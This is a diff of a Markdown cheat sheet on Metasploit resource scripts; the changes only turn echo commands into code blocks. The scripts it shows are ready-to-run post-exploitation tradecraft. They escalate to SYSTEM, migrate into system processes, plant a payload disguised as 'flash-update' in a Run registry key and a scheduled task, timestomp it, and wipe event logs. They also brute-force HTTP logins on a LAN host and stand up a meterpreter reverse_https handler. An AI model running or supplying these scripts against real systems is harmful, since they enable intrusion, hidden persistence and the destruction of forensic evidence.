@@ -125,59 +125,58 @@
 ## RESOURCE SCRIPTS IN POST EXPLOITATION
 <blockquote>Auto-run scripts are great when you need multiple modules to run automatically. Lets assume the first thing(s) we do after a successfully exploitation its to elevate the current session to NT authority/system, take a screenshot of current desktop, migrate to another process and run post exploitation modules. Having all this commands inside a rc script saves us time.</blockquote>
 
-- **Resource script to elevate session, take screenshot, migrate and run post-modules::**`[bash prompt]`<br />
+- **Resource script to elevate session, take screenshot, migrate and run post-modules::**`[script.rc]`<br />
 
-      touch script.rc
-
-        echo 'getprivs' > script.rc
-        echo 'getsystem' >> script.rc
-        echo 'screenshot' >> script.rc
-        echo 'migrate -n wininit.exe' >> script.rc
-        echo 'use post/windows/gather/enum_applications' >> script.rc
-        echo 'run' >> script.rc
-        echo 'use post/multi/recon/local_exploit_suggester' >> script.rc
-        echo 'run' >> script.rc
-
-     `[run] meterpreter >` resource /root/script.rc
+```
+getprivs
+getsystem
+screenshot
+migrate -n wininit.exe
+use post/windows/gather/enum_applications
+run
+use post/multi/recon/local_exploit_suggester
+run
+```
+`[run] meterpreter >` resource /root/script.rc
 
 <br /><br />
 
 <blockquote>Auto-run scripts are great when you need to persiste fast your payload automatically. This next example demonstrates how to use resource scripts to successfully persiste a payload in target system and clean tracks (timestomp & clearev) after exploitation using meterpreter core commands written inside one resource script.</blockquote>
 
-- **Resource script to elevate session, migrate, persiste payload and clear tracks::**`[bash prompt]`<br />
+- **Resource script to elevate session, migrate, persiste payload and clear tracks::**`[persistence.rc]`<br />
 
-      touch persistence.rc
-
-        echo 'getprivs' > persistence.rc
-        echo 'getsystem' >> persistence.rc
-        echo 'migrate -n explorer.exe' >> persistence.rc
-        echo 'upload update.exe %temp%\\update.exe' >> persistence.rc
-        echo "timestomp -z '3/10/1999 15:15:15' %temp%\\update.exe" >> persistence.rc
-        echo 'reg setval -k HKLM\\Software\\Microsoft\\Windows\\Currentversion\\Run -v flash-update -d %temp%\\update.exe' >> persistence.rc
-        echo 'scheduleme -m 10 -c "%temp%\\update.exe"' >> persistence.rc
-        echo 'clearev' >> persistence.rc
-
-     `[run] meterpreter >` resource /root/persistence.rc
+```
+getprivs
+getsystem
+migrate -n explorer.exe
+upload update.exe %temp%\\update.exe
+timestomp -z '3/10/1999 15:15:15' %temp%\\update.exe
+reg setval -k HKLM\\Software\\Microsoft\\Windows\\Currentversion\\Run -v flash-update -d %temp%\\update.exe
+scheduleme -m 10 -c "%temp%\\update.exe"
+clearev
+```
+`[run] meterpreter >` resource /root/persistence.rc
 
 <br /><br />
 
 <blockquote>In the next resource script all auxiliary modules require that RHOSTS and THREADS options are set before running the modules. In the next example we are using SETG (global variable declarations) to configurate all the options that we need before running the modules. So its advice before writing a resource file like this one, to first check what options are required for the auxiliary to run. The next rc script will run 3 auxiliary modules againts all hosts found inside local lan.</blockquote>
 
-- **Using SETG global variable to config auxiliary(s) modules options::**`[bash prompt]`<br />
+- **Using SETG global variable to config auxiliary(s) modules options::**`[http_brute.rc]`<br />
 
-      touch http_brute.rc
+```
+setg THREADS 15
+setg RHOSTS 192.168.1.254
 
-         echo 'setg THREADS 15' > /root/http_brute.rc
-         echo 'setg RHOSTS 192.168.1.254' >> /root/http_brute.rc
-         echo 'use auxiliary/scanner/http/http_version' >> /root/http_brute.rc
-         echo 'run' >> /root/http_brute.rc
-         echo 'use auxiliary/scanner/http/dir_scanner' >> /root/http_brute.rc
-         echo 'run' >> /root/http_brute.rc
-         echo 'use auxiliary/scanner/http/http_login' >> /root/http_brute.rc
-         echo 'run' >> /root/http_brute.rc
-         echo 'unsetg RHOSTS THREADS' >> /root/http_brute.rc
+   use auxiliary/scanner/http/http_version
+   run
+   use auxiliary/scanner/http/dir_scanner
+   run
+   use auxiliary/scanner/http/http_login
+   run
 
-     `[run]` msfconsole -r /root/http_brute.rc
+unsetg RHOSTS THREADS
+```
+`[run]` msfconsole -r /root/http_brute.rc
 
 ![gif](http://i66.tinypic.com/2usid92.gif)
 
@@ -194,28 +193,29 @@
 
 - **RC::Post-Exploit::Script::Gather::**`[gather.rc]`<br />
 
-      touch gather.rc
-
-         echo 'sysinfo' > /root/gather.rc
-         echo 'getuid' >> /root/gather.rc
-         echo 'services' >> /root/gather.rc
-         echo 'sessions -v' >> /root/gather.rc
+```
+sysinfo
+getuid
+services
+sessions -v
+```
 
 - **RC::AutoRunScript::Handler::**`[handler.rc]`<br />
 
-      touch handler.rc
+```
+setg RESOURCE /root/gather.rc
 
-         echo 'setg RESOURCE /root/gather.rc' > handler.rc
-         echo 'use exploit/multi/handler' >> handler.rc
-         echo 'set AutoRunScript post/multi/gather/multi_command' >> handler.rc
-         echo 'set PAYLOAD windows/meterpreter/reverse_https' >> handler.rc
-         echo 'set ExitOnSession false' >> handler.rc
-         echo 'set LHOST 192.168.1.71' >> handler.rc
-         echo 'set LPORT 666' >> handler.rc
-         echo 'exploit' >> handler.rc
-         echo 'unsetg RESOURCE' >> handler.rc
+   use exploit/multi/handler
+   set AutoRunScript post/multi/gather/multi_command
+   set PAYLOAD windows/meterpreter/reverse_https
+   set ExitOnSession false
+   set LHOST 192.168.1.71
+   set LPORT 666
+   exploit
 
-     `[run]` msfconsole -r /root/handler.rc
+unsetg RESOURCE
+```
+`[run]` msfconsole -r /root/handler.rc
 
 <br /><br />
 
